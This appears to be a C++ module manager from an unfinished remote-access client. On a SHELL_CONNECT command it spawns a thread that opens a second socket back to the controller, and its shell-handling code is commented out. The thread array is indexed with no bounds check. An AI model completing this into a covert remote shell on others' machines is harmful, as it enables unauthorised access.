#include "pch.h"
#include "ModuleManage.h"
#include "Packet.h"
#include "SocketClient.h"



CModuleManage::CModuleManage(CSocketClient* pMainSocketClient) {
	m_pMainSocketClient = pMainSocketClient;

	memset(m_ahThread, 0, sizeof(m_ahThread));
	m_dwThreadNum = 0;

}


CModuleManage::~CModuleManage() {

}


void CModuleManage::OnReceivePacket(CPacket* pPacket) {
	CPacket* pPacketCopy = new CPacket(*pPacket);

	switch (pPacket->m_PacketHead.wCommandId) {
	case SHELL_CONNECT:
		m_ahThread[m_dwThreadNum++] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)RunModuleShellRemote, (LPVOID)pPacketCopy, 0, NULL);
		break;

	default:
		break;
	}
}



DWORD WINAPI RunModuleShellRemote(CPacket* pPacket)
{
	CSocketClient* pChildSocketClient = new CSocketClient(pPacket->m_pSocketClient->m_pMainSocketClient);

	pChildSocketClient->StartSocketClient();
	printf("CONNECT packet\n");
	pChildSocketClient->SendPacket(SHELL_CONNECT, NULL, 0);

	//pChildSocketClient->




	//CShellManager	manager(&socketClient);

	//socketClient.run_event_loop();

	return 0;
}